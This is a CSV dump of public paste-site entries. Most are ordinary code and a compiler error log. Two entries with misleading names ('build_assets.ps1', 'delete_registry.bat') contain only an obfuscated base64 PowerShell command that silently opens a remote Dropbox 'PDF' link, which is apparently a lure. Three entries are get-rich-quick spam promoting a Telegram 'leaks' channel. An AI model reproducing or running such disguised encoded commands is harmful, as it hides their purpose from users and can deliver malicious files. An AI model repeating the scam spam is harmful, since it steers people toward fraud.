id,title,username,language,date,content
YPC6iF00,build_assets.ps1,Miguel6t75,Batch,Sunday 29th of June 2025 06:34:08 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9ADUAYgBmADIAMQAyADQAZgA=

eTcVv"
buvgXB1R,Make $1200 in 15 minutes S,w3tse3fswrf,JavaScript,Sunday 29th of June 2025 06:33:11 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/WesGuid
ACC 6702418
"
1cHAag5C,MAKE $500 INSTANTLY W,fakouff,JavaScript,Sunday 29th of June 2025 06:32:24 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/WesGuid
ACC 6210029
"
hXwbaC1N,MAKE $500 INSTANTLY E,GJovi,JavaScript,Sunday 29th of June 2025 06:31:50 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/WesGuid
ACC 1208488
"
Q2srE66K,Movement_Jump,GigaOrts,C#,Sunday 29th of June 2025 06:27:25 AM CDT,"using UnityEngine;

public class Movement : MonoBehaviour
{
    public float moveSpeed = 5f;
    public float jumpForce = 10f;
    private Rigidbody2D rb;

    private bool isGrounded;
    private bool doubleJump;
    
    void Start()
    {
        rb = GetComponent<Rigidbody2D>();
    }

    void Update()
    {
        float moveInput = Input.GetAxis(""Horizontal"");
        rb.velocity = new Vector2(moveInput * moveSpeed, rb.velocity.y);

        bool canJump = isGrounded;
        bool canDoubleJump = isGrounded == false && doubleJump;

        if (Input.GetKeyDown(KeyCode.Space))
        {
            if (canJump)
            {
                Jump();
            }
            else if (canDoubleJump)
            {
                Jump();
                doubleJump = false;
            }
        }
    }

    private void Jump()
    {
        rb.velocity = new Vector2(rb.velocity.x, jumpForce);
    }

    void OnCollisionEnter2D(Collision2D collision)
    {
        isGrounded = true;
        doubleJump = true;
    }

    void OnCollisionExit2D(Collision2D collision)
    {
        isGrounded = false;
    }
}
"
HQkx6LNx,delete_registry.bat,Miguel6t75,Batch,Sunday 29th of June 2025 06:24:05 AM CDT,"powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwB4AGwANAA0AGgAOQAzAHEAYwAzAHAAawAzAGoAZwAzAGIAaQAyAG8AMwAvAG4AZQB3AHQAdQB0AC4AcABkAGYAPwByAGwAawBlAHkAPQB2AHoANwB0ADIANgBpAGkAMwBtAGIAYgBvAGEANgB0AGwAMAAyAHEAZgB5AHUAOQBlACYAZQA9ADEAJgBzAHQAPQBkAGIAaQA2AGoAcQA2AGYAIgAgACAAIwAgAGkAZAA9ADAAOQAyADkAZAAzAGQAYQA=

fGiks"
7q4NdkKJ,pixdecor,bluebyt,INI file,Sunday 29th of June 2025 06:10:45 AM CDT,"ninja -C build
ninja: Entering directory `build'
[1/7] Compiling C++ object src...ixdecor.so.p/deco-button.cpp.
FAILED: src/libpixdecor.so.p/deco-button.cpp.o
c++ -Isrc/libpixdecor.so.p -Isrc -I../src -I/opt/wayfire/include -I/usr/include/pango-1.0 -I/usr/include/cairo -I/usr/include/libmount -I/usr/include/blkid -I/usr/include/fribidi -I/usr/include/harfbuzz -I/usr/include/freetype2 -I/usr/include/libpng16 -I/usr/include/glib-2.0 -I/usr/lib/glib-2.0/include -I/usr/include/sysprof-6 -I/opt/wayfire/include/wlroots-0.18 -I/usr/include/pixman-1 -I/usr/include/libdrm -I/usr/include/libevdev-1.0 -I/usr/include/libxml2 -fdiagnostics-color=always -D_GLIBCXX_ASSERTIONS=1 -D_FILE_OFFSET_BITS=64 -Wall -Winvalid-pch -std=c++17 -O0 -g -DWLR_USE_UNSTABLE -DWAYFIRE_PLUGIN -fPIC -pthread -MD -MQ src/libpixdecor.so.p/deco-button.cpp.o -MF src/libpixdecor.so.p/deco-button.cpp.o.d -o src/libpixdecor.so.p/deco-button.cpp.o -c ../src/deco-button.cpp
In file included from ../src/deco-button.cpp:1:
../src/deco-button.hpp:8:10: fatal error: wayfire/plugins/common/simple-texture.hpp: No such file or directory
    8 | #include <wayfire/plugins/common/simple-texture.hpp>
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.
[2/7] Compiling C++ object src...ixdecor.so.p/deco-layout.cpp.
FAILED: src/libpixdecor.so.p/deco-layout.cpp.o
c++ -Isrc/libpixdecor.so.p -Isrc -I../src -I/opt/wayfire/include -I/usr/include/pango-1.0 -I/usr/include/cairo -I/usr/include/libmount -I/usr/include/blkid -I/usr/include/fribidi -I/usr/include/harfbuzz -I/usr/include/freetype2 -I/usr/include/libpng16 -I/usr/include/glib-2.0 -I/usr/lib/glib-2.0/include -I/usr/include/sysprof-6 -I/opt/wayfire/include/wlroots-0.18 -I/usr/include/pixman-1 -I/usr/include/libdrm -I/usr/include/libevdev-1.0 -I/usr/include/libxml2 -fdiagnostics-color=always -D_GLIBCXX_ASSERTIONS=1 -D_FILE_OFFSET_BITS=64 -Wall -Winvalid-pch -std=c++17 -O0 -g -DWLR_USE_UNSTABLE -DWAYFIRE_PLUGIN -fPIC -pthread -MD -MQ src/libpixdecor.so.p/deco-layout.cpp.o -MF src/libpixdecor.so.p/deco-layout.cpp.o.d -o src/libpixdecor.so.p/deco-layout.cpp.o -c ../src/deco-layout.cpp
In file included from ../src/deco-layout.hpp:5,
                 from ../src/deco-layout.cpp:1:
../src/deco-button.hpp:8:10: fatal error: wayfire/plugins/common/simple-texture.hpp: No such file or directory
    8 | #include <wayfire/plugins/common/simple-texture.hpp>
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.
[3/7] Compiling C++ object src...cor.so.p/deco-subsurface.cpp.
FAILED: src/libpixdecor.so.p/deco-subsurface.cpp.o
c++ -Isrc/libpixdecor.so.p -Isrc -I../src -I/opt/wayfire/include -I/usr/include/pango-1.0 -I/usr/include/cairo -I/usr/include/libmount -I/usr/include/blkid -I/usr/include/fribidi -I/usr/include/harfbuzz -I/usr/include/freetype2 -I/usr/include/libpng16 -I/usr/include/glib-2.0 -I/usr/lib/glib-2.0/include -I/usr/include/sysprof-6 -I/opt/wayfire/include/wlroots-0.18 -I/usr/include/pixman-1 -I/usr/include/libdrm -I/usr/include/libevdev-1.0 -I/usr/include/libxml2 -fdiagnostics-color=always -D_GLIBCXX_ASSERTIONS=1 -D_FILE_OFFSET_BITS=64 -Wall -Winvalid-pch -std=c++17 -O0 -g -DWLR_USE_UNSTABLE -DWAYFIRE_PLUGIN -fPIC -pthread -MD -MQ src/libpixdecor.so.p/deco-subsurface.cpp.o -MF src/libpixdecor.so.p/deco-subsurface.cpp.o.d -o src/libpixdecor.so.p/deco-subsurface.cpp.o -c ../src/deco-subsurface.cpp
In file included from ../src/deco-layout.hpp:5,
                 from ../src/deco-subsurface.cpp:22:
../src/deco-button.hpp:8:10: fatal error: wayfire/plugins/common/simple-texture.hpp: No such file or directory
    8 | #include <wayfire/plugins/common/simple-texture.hpp>
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.
[4/7] Compiling C++ object src...pixdecor.so.p/deco-theme.cpp.
FAILED: src/libpixdecor.so.p/deco-theme.cpp.o
c++ -Isrc/libpixdecor.so.p -Isrc -I../src -I/opt/wayfire/include -I/usr/include/pango-1.0 -I/usr/include/cairo -I/usr/include/libmount -I/usr/include/blkid -I/usr/include/fribidi -I/usr/include/harfbuzz -I/usr/include/freetype2 -I/usr/include/libpng16 -I/usr/include/glib-2.0 -I/usr/lib/glib-2.0/include -I/usr/include/sysprof-6 -I/opt/wayfire/include/wlroots-0.18 -I/usr/include/pixman-1 -I/usr/include/libdrm -I/usr/include/libevdev-1.0 -I/usr/include/libxml2 -fdiagnostics-color=always -D_GLIBCXX_ASSERTIONS=1 -D_FILE_OFFSET_BITS=64 -Wall -Winvalid-pch -std=c++17 -O0 -g -DWLR_USE_UNSTABLE -DWAYFIRE_PLUGIN -fPIC -pthread -MD -MQ src/libpixdecor.so.p/deco-theme.cpp.o -MF src/libpixdecor.so.p/deco-theme.cpp.o.d -o src/libpixdecor.so.p/deco-theme.cpp.o -c ../src/deco-theme.cpp
In file included from ../src/deco-theme.hpp:4,
                 from ../src/deco-theme.cpp:1:
../src/deco-button.hpp:8:10: fatal error: wayfire/plugins/common/simple-texture.hpp: No such file or directory
    8 | #include <wayfire/plugins/common/simple-texture.hpp>
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.
[5/7] Compiling C++ object src...xdecor.so.p/deco-effects.cpp.
FAILED: src/libpixdecor.so.p/deco-effects.cpp.o
c++ -Isrc/libpixdecor.so.p -Isrc -I../src -I/opt/wayfire/include -I/usr/include/pango-1.0 -I/usr/include/cairo -I/usr/include/libmount -I/usr/include/blkid -I/usr/include/fribidi -I/usr/include/harfbuzz -I/usr/include/freetype2 -I/usr/include/libpng16 -I/usr/include/glib-2.0 -I/usr/lib/glib-2.0/include -I/usr/include/sysprof-6 -I/opt/wayfire/include/wlroots-0.18 -I/usr/include/pixman-1 -I/usr/include/libdrm -I/usr/include/libevdev-1.0 -I/usr/include/libxml2 -fdiagnostics-color=always -D_GLIBCXX_ASSERTIONS=1 -D_FILE_OFFSET_BITS=64 -Wall -Winvalid-pch -std=c++17 -O0 -g -DWLR_USE_UNSTABLE -DWAYFIRE_PLUGIN -fPIC -pthread -MD -MQ src/libpixdecor.so.p/deco-effects.cpp.o -MF src/libpixdecor.so.p/deco-effects.cpp.o.d -o src/libpixdecor.so.p/deco-effects.cpp.o -c ../src/deco-effects.cpp
../src/deco-effects.cpp: In member function ‘void wf::pixdecor::smoke_t::create_programs()’:
../src/deco-effects.cpp:2151:13: error: ‘render_begin’ is not a member of ‘OpenGL’
 2151 |     OpenGL::render_begin();
      |             ^~~~~~~~~~~~
../src/deco-effects.cpp:2212:13: error: ‘render_end’ is not a member of ‘OpenGL’
 2212 |     OpenGL::render_end();
      |             ^~~~~~~~~~
../src/deco-effects.cpp: In member function ‘void wf::pixdecor::smoke_t::step_effect(const wf::render_target_t&, wf::geometry_t, bool, wf::pointf_t, wf::color_t, wf::color_t, int, int, int’:
../src/deco-effects.cpp:2426:13: error: ‘render_begin’ is not a member of ‘OpenGL’
 2426 |     OpenGL::render_begin(fb);
      |             ^~~~~~~~~~~~
../src/deco-effects.cpp:2592:13: error: ‘render_end’ is not a member of ‘OpenGL’
 2592 |     OpenGL::render_end();
      |             ^~~~~~~~~~
../src/deco-effects.cpp: In member function ‘void wf::pixdecor::smoke_t::render_effect(const wf::render_target_t&, wf::geometry_t, const wf::region_t&)’:
../src/deco-effects.cpp:2598:54: error: invalid conversion from ‘GLuint’ {aka ‘unsigned int’} to ‘wlr_texture*’ [-fpermissive]
 2598 |     OpenGL::render_transformed_texture(wf::texture_t{t}, rectangle,
      |                                                      ^
      |                                                      |
      |                                                      GLuint {aka unsigned int}
../src/deco-effects.cpp:2599:12: error: ‘const struct wf::render_target_t’ has no member named ‘get_orthographic_projection’
 2599 |         fb.get_orthographic_projection(), glm::vec4{1},
      |            ^~~~~~~~~~~~~~~~~~~~~~~~~~~
../src/deco-effects.cpp:2604:12: error: ‘const struct wf::render_target_t’ has no member named ‘logic_scissor’
 2604 |         fb.logic_scissor(wlr_box_from_pixman_box(box));
      |            ^~~~~~~~~~~~~
../src/deco-effects.cpp: In member function ‘void wf::pixdecor::smoke_t::effect_updated()’:
../src/deco-effects.cpp:2614:13: error: ‘render_begin’ is not a member of ‘OpenGL’
 2614 |     OpenGL::render_begin();
      |             ^~~~~~~~~~~~
../src/deco-effects.cpp:2616:13: error: ‘render_end’ is not a member of ‘OpenGL’
 2616 |     OpenGL::render_end();
      |             ^~~~~~~~~~
[6/7] Compiling C++ object src...pixdecor.so.p/decoration.cpp.
FAILED: src/libpixdecor.so.p/decoration.cpp.o
c++ -Isrc/libpixdecor.so.p -Isrc -I../src -I/opt/wayfire/include -I/usr/include/pango-1.0 -I/usr/include/cairo -I/usr/include/libmount -I/usr/include/blkid -I/usr/include/fribidi -I/usr/include/harfbuzz -I/usr/include/freetype2 -I/usr/include/libpng16 -I/usr/include/glib-2.0 -I/usr/lib/glib-2.0/include -I/usr/include/sysprof-6 -I/opt/wayfire/include/wlroots-0.18 -I/usr/include/pixman-1 -I/usr/include/libdrm -I/usr/include/libevdev-1.0 -I/usr/include/libxml2 -fdiagnostics-color=always -D_GLIBCXX_ASSERTIONS=1 -D_FILE_OFFSET_BITS=64 -Wall -Winvalid-pch -std=c++17 -O0 -g -DWLR_USE_UNSTABLE -DWAYFIRE_PLUGIN -fPIC -pthread -MD -MQ src/libpixdecor.so.p/decoration.cpp.o -MF src/libpixdecor.so.p/decoration.cpp.o.d -o src/libpixdecor.so.p/decoration.cpp.o -c ../src/decoration.cpp
In file included from ../src/shade.hpp:6,
                 from ../src/decoration.cpp:23:
/opt/wayfire/include/wayfire/view-transform.hpp:207:10: warning: ‘void wf::scene::transformer_render_instance_t<NodeType>::render(const wf::scene::render_instruction_t&) [with NodeType = wf::scene::transformer_base_node_t]’ was hidden [-Woverloaded-virtual=]
  207 |     void render(const wf::scene::render_instruction_t& data) override
      |          ^~~~~~
../src/shade.hpp:81:14: note:   by ‘void wf::pixdecor::pixdecor_shade::simple_node_render_instance_t::render(const wf::render_target_t&, const wf::region_t&)’
   81 |         void render(const wf::render_target_t& target,
      |              ^~~~~~
../src/shade.hpp: In member function ‘void wf::pixdecor::pixdecor_shade::simple_node_render_instance_t::render(const wf::render_target_t&, const wf::region_t&)’:
../src/shade.hpp:98:21: error: ‘render_begin’ is not a member of ‘OpenGL’
   98 |             OpenGL::render_begin(target);
      |                     ^~~~~~~~~~~~
../src/shade.hpp:101:24: error: ‘const struct wf::render_target_t’ has no member named ‘logic_scissor’
  101 |                 target.logic_scissor(wlr_box_from_pixman_box(box));
      |                        ^~~~~~~~~~~~~
../src/shade.hpp:105:28: error: ‘const struct wf::render_target_t’ has no member named ‘get_orthographic_projection’
  105 |                     target.get_orthographic_projection(), glm::vec4(1.0), 0);
      |                            ^~~~~~~~~~~~~~~~~~~~~~~~~~~
../src/shade.hpp:114:24: error: ‘const struct wf::render_target_t’ has no member named ‘logic_scissor’
  114 |                 target.logic_scissor(wlr_box_from_pixman_box(box));
      |                        ^~~~~~~~~~~~~
../src/shade.hpp:116:28: error: ‘const struct wf::render_target_t’ has no member named ‘get_orthographic_projection’
  116 |                     target.get_orthographic_projection(), glm::vec4(1.0), 0);
      |                            ^~~~~~~~~~~~~~~~~~~~~~~~~~~
../src/shade.hpp:119:21: error: ‘render_end’ is not a member of ‘OpenGL’
  119 |             OpenGL::render_end();
      |                     ^~~~~~~~~~
ninja: build stopped: subcommand failed."
hXgG0K1j,dataNone,TestGuy1,JSON,Sunday 29th of June 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '60a9788dee3a138ca879ebedd1d45b03076850d2880c0b4c261cfd54a45c0ed5eba55f2817e110abf30a3483111688f96119e9101f7bfee46b3fe4d625d38436bf05a1b7abeac93b4591902ed4b317f6a6363e9a8e29578273a604fcafc30785ebe11fdeeb54c489ec4b400aa8c8eb2f99cdaebfc12df7caae9edc9e1f40f197',
  otherdata: [
    '23c4e5631336a1c4f53b080df403d7b7',
    'cf6704fea552ef7c56bdf83009a80c5e',
    '306ead196973f482331ba2b755d29c22',
    '6cdaaba601c22a4e273876d0db0d123d',
    'b1c9eaeca36bf5f98435c1984e3b4a30',
    'fb338d16c2aeebb9d901b793fe43f550',
    '4369cab57560e579b7237cedcfc840e0',
    '3e32c9fc2f6eb83e18a835b1ad6a04f6'
  ]
}"
RwfgnP7S,Extra Health Gamepass,Sungmingamerpro13,CSS,Sunday 29th of June 2025 05:58:20 AM CDT,"local ExtraHealthGamepassId = 1100804196

local function ExtraHealth(player, number)
	local Character = player.Character
	local Humanoid = Character:FindFirstChild(""Humanoid"")
	Humanoid.MaxHealth = number
	Humanoid.Health = number
end

game.Players.PlayerAdded:Connect(function(player)
	player.CharacterAdded:Connect(function()
		if not game:GetService(""MarketplaceService""):UserOwnsGamePassAsync(player.UserId, ExtraHealthGamepassId) then
			ExtraHealth(player, 100)
		else
			ExtraHealth(player, 150)
		end
	end)
end)
"
tJ7a4DqC,HA_58,coloriot,C++,Sunday 29th of June 2025 05:55:53 AM CDT,"/*

Доказательство условия про два ребра:

- inB[v] + inC[v] считаем только по ""живым"" годам.
 
- Замечание: когда алгоритм закончился, для любой вершины
inB[v] == 1 и inC[v] == 1.
 
- Действительно, исходящих рёбер каждого цвета ровно |V|,
а условие задачи требует ≥1 входа каждого цвета;
 
- поэтому два входа одного цвета в одну вершину невозможны.
*/


/*************************************************************
 *  Для каждого года i есть два ориентированных ребра
 *      Ai ──(blue)──► Bi
 *      Ai ──(red) ─► Ci
 *
 *  Оставляем подмножество лет  S.  Требование условия:
 *
 *  в каждую вершину входит ≥ 1 blue-и ≥ 1 red-ребро.
 *  Поэтому в корректном ответе в вершину не может
 *  входить два ребра одного цвета – иначе какой-то
 *  вершине не хватило бы входов (принцип Дирихле).
 *
 *  Алгоритм “листопад”.
 *  ------------------------------------
 *  • inB[v], inC[v] –- число blue/red входов из ещё
 *    «живых» лет;
 *  • occCnt[v] – число «живых» лет,
 *    где v встречается в A,B или C.
 *  • Очередь Q из вершин, у которых  inB==0 || inC==0.
 *  • Пока Q не пуста:
 *        v = pop()
 *        если  occCnt[v] == 0     continue
 *        для каждого года idx, где v встречается
 *            if removed[idx]      continue
 *            removed[idx] = true
 *            --occCnt[ Aidx ], occCnt[ Bidx ], occCnt[ Cidx ]
 *            --inB[ Bidx ],  --inC[ Cidx ];
 *            если какая-то вершина осталась без входа
 *            ⇒ push в очередь
 *  ответ = удаленные года. 
 *  Работает O(N) памяти/времени:
 *  каждый год и вершина обрабатываются максимум один раз.
 *************************************************************/

#include <bits/stdc++.h>
using namespace std;

struct Triple { int a, b, c; };

int main() {
    ios::sync_with_stdio(false);
    cin.tie(nullptr);

    int N;
    if (!(cin >> N)) return 0;

    vector<Triple> yr(N);
    for (int i = 0; i < N; ++i) cin >> yr[i].a;
    for (int i = 0; i < N; ++i) cin >> yr[i].b;
    for (int i = 0; i < N; ++i) cin >> yr[i].c;

    const int SZ = N + 1;                 // вершины 1..N
    vector<int> inB(SZ, 0), inC(SZ, 0), occCnt(SZ, 0);
    vector<vector<int>> occ(SZ);          // годы, где встречается вершина

    // собираем ""статистику""
    for (int i = 0; i < N; ++i) {
        auto [a,b,c] = yr[i];
        ++inB[b]; ++inC[c];
        for (int v : {a,b,c}) {
            ++occCnt[v];
            occ[v].push_back(i);
        }
    }

    queue<int> Q;
    vector<char> inQ(SZ, 0);
    auto push_if_bad = [&](int v) {
        if (occCnt[v] && (inB[v]==0 || inC[v]==0) && !inQ[v]) {
            Q.push(v); inQ[v] = 1;
        }
    };
    for (int v = 1; v <= N; ++v) push_if_bad(v);

    vector<char> removedYr(N, 0);
    int removedCnt = 0;

    while (!Q.empty()) {
        int v = Q.front(); Q.pop(); inQ[v] = 0;
        if (occCnt[v]==0) continue;          
        // могла обнулиться раньше

        for (int idx : occ[v]) {
            if (removedYr[idx]) continue;
            removedYr[idx] = 1;
            ++removedCnt;

            auto [a,b,c] = yr[idx];

            // убрали год – вершины в нём проявляются на год меньше */
            for (int u : {a,b,c}) {
                if (--occCnt[u]==0) inQ[u]=0;   
                // совсем исчезла
            }

            // у целей ушёл вход
            if (--inB[b]==0) push_if_bad(b);
            if (--inC[c]==0) push_if_bad(c);
        }
    }

    cout << removedCnt << '\n';
    return 0;
}"
y3r8GwGx,HA_57,coloriot,C++,Sunday 29th of June 2025 05:44:05 AM CDT,"/*
 * Вход:
 *   n                        — количество вершин (0 … n-1)
 *   затем n строк:           — описание каждой вершины
 *     <буква>  <left> <right>
 *       буква  – символ 'A' … 'Z' в самой вершине
 *       left   – индекс левого ребёнка или −1
 *       right  – индекс правого ребёнка или −1
 *
 * Корень – та вершина, которая нигде не встречается как чайлд.
 */

/*
7
A 1 2
B 3 4
C 5 6
D -1 -1
E -1 -1
F -1 -1
E -1 -1 
*/

#include <bits/stdc++.h> 
// Так вызываются все стандартные библиотеки
using namespace std;

struct Node {
    char c;     // буква
    int  left;  // индекс левого чайлда или -1
    int  right; // индекс правого чайлда или -1
};

// информация, которую храним в хэше для каждой маски
struct Info {
    int idx;   // вершина
    int size;  // размер поддерева
};

vector<Node> tree;                       // сами вершины
unordered_map<uint32_t, Info> seenMask;  // mask → лучшая вершина
pair<int,int> firstPair{-1,-1};          // ответ на «лёгкую» версию
pair<int,int> bestPair{-1,-1};           // ответ на «сложную» версию
int bestSum = -1;                        // максимум size(u)+size(v)

/* DFS возвращает:
 *   mask  — 26-битная маска букв поддерева
 *   size  — количество вершин поддерева
 */
pair<uint32_t,int> dfs(int v)
{
    if (v == -1) return {0u, 0};

    auto [mL, sL] = dfs(tree[v].left);
    auto [mR, sR] = dfs(tree[v].right);

    uint32_t myMask = mL | mR | (1u << (tree[v].c - 'A'));
    int      mySize = sL + sR + 1;

    auto it = seenMask.find(myMask);

    // первая пара дублей → ответ «лёгкой» задачи
    if (it != seenMask.end() && firstPair.first == -1)
        firstPair = {it->second.idx, v};

    // обновляем максимум для «сложной» версии
    if (it != seenMask.end()) {
        int curSum = it->second.size + mySize;
        if (curSum > bestSum) {
            bestSum = curSum;
            bestPair = {it->second.idx, v};
        }
        // в таблице оставляем вершину с бОльшим поддеревом —
        // это для следующих сравнений
        if (mySize > it->second.size)
            it->second = {v, mySize};
    } else {
        seenMask.emplace(myMask, Info{v, mySize});
    }

    return {myMask, mySize};
}

int main()
{
    ios::sync_with_stdio(false);
    cin.tie(nullptr);

    int n;
    if (!(cin >> n)) return 0;

    tree.resize(n);
    for (int i = 0; i < n; ++i) {
        char ch; int l, r;
        cin >> ch >> l >> r;
        tree[i] = {ch, l, r};
    }

    /* определяем корень: тот, 
    кто не является ничьим чайлдом */
    vector<int> isChild(n, 0);
    for (auto &v : tree) {
        if (v.left  != -1) isChild[v.left]  = 1;
        if (v.right != -1) isChild[v.right] = 1;
    }
    int root = find(isChild.begin(), isChild.end(), 0) - isChild.begin();
    if (root == n) { cerr << ""root not found\n""; return 0; }

    dfs(root);

    if (firstPair.first == -1)
        cout << ""No equivalent vertices\n"";
    else {
        cout << ""Easy version pair: ""  << firstPair.first << ' ' << firstPair.second << '\n';
        cout << ""Hard version pair: ""  << bestPair.first  << ' ' << bestPair.second
             << "" (sum = "" << bestSum << "")\n"";
    }
    return 0;
}"
suTeSLyv,NoggiParameterReplicator,vizrtexample,VBScript,Sunday 29th of June 2025 04:57:39 AM CDT,"Dim containers as Array[container]
Dim filters As Array[String]
filters.Push(""All"")
filters.Push(""by Name"")

Sub OnInitParameters()
    RegisterParameterBool(""edit"", ""Edit Parameters"", False)
    RegisterParameterContainer(""Container"", ""Root Container"")
    RegisterRadioButton(""filter"", ""Find Noggi"", 0, filters)
    RegisterParameterString(""cName"", ""Name"", """", 32, 100, """")
    RegisterParameterDouble(""width"", ""Width"", 100, 0, 10000)
    RegisterParameterDouble(""height"", ""Height"", 100, 0, 10000)
    RegisterParameterBool(""doCrop"", ""Crop"", False)
    RegisterParameterDouble(""crop_left"", ""Left Crop Face"", -50, -10000, 10000)
    RegisterParameterDouble(""crop_right"", ""Right Crop Face"", 50, -10000, 10000)
    RegisterParameterDouble(""crop_bottom"", ""Bottom Crop Face"", -50, -10000, 10000)
    RegisterParameterDouble(""crop_top"", ""Top Crop Face"", 50, -10000, 10000)
End Sub

Sub OnParameterChanged(parameterName As String)
    Dim c = GetParameterContainer(""Container"")
    If Not c.Valid Then
        c = this
    End If
    c.GetContainerAndSubContainers(containers, False)

    If GetParameterBool(""edit"") Then
        Dim filterType = GetParameterInt(""filter"")
        For i = 0 To containers.UBound
            Dim plugin As PluginInstance = containers[i].Geometry.PluginInstance
            If plugin.Valid Then
                Select Case filterType
                    Case 0 ' All
                        If plugin.PluginName = ""Noggi"" Then
                            ApplyPluginChanges(plugin, parameterName)
                        End If
                    Case 1 ' by Name
                        If plugin.PluginName = ""Noggi"" And containers[i].name = GetParameterString(""cName"") Then
                            ApplyPluginChanges(plugin, parameterName)
                        End If
                End Select
            End If
        Next
    End If
End Sub

Sub ApplyPluginChanges(plugin As PluginInstance, parameterName As String)
    Select Case parameterName
        Case ""width""
            plugin.SetParameterDouble(""width"", GetParameterDouble(""width""))
        Case ""height""
            plugin.SetParameterDouble(""height"", GetParameterDouble(""height""))
        Case ""doCrop""
            plugin.SetParameterBool(""doCrop"", GetParameterBool(""doCrop""))
        Case ""crop_left""
            plugin.SetParameterDouble(""crop_left"", GetParameterDouble(""crop_left""))
        Case ""crop_right""
            plugin.SetParameterDouble(""crop_right"", GetParameterDouble(""crop_right""))
        Case ""crop_bottom""
            plugin.SetParameterDouble(""crop_bottom"", GetParameterDouble(""crop_bottom""))
        Case ""crop_top""
            plugin.SetParameterDouble(""crop_top"", GetParameterDouble(""crop_top""))
    End Select
End Sub

Sub OnGuiStatus()
    Select Case GetParameterBool(""edit"")
        Case True
            If GetParameterInt(""filter"") = 1 Then
                SendGuiParameterShow(""cName"", SHOW)
            Else
                SendGuiParameterShow(""cName"", HIDE)
            End If
            SendGuiParameterShow(""Container"", SHOW)
            SendGuiParameterShow(""filter"", SHOW)
            SendGuiParameterShow(""height"", SHOW)
            SendGuiParameterShow(""width"", SHOW)
            SendGuiParameterShow(""doCrop"", SHOW)
            SendGuiParameterShow(""crop_left"", SHOW)
            SendGuiParameterShow(""crop_right"", SHOW)
            SendGuiParameterShow(""crop_bottom"", SHOW)
            SendGuiParameterShow(""crop_top"", SHOW)
        Case False
            SendGuiParameterShow(""Container"", HIDE)
            SendGuiParameterShow(""filter"", HIDE)
            SendGuiParameterShow(""width"", HIDE)
            SendGuiParameterShow(""height"", HIDE)
            SendGuiParameterShow(""cName"", HIDE)
            SendGuiParameterShow(""doCrop"", HIDE)
            SendGuiParameterShow(""crop_left"", HIDE)
            SendGuiParameterShow(""crop_right"", HIDE)
            SendGuiParameterShow(""crop_bottom"", HIDE)
            SendGuiParameterShow(""crop_top"", HIDE)
    End Select
End Sub
"
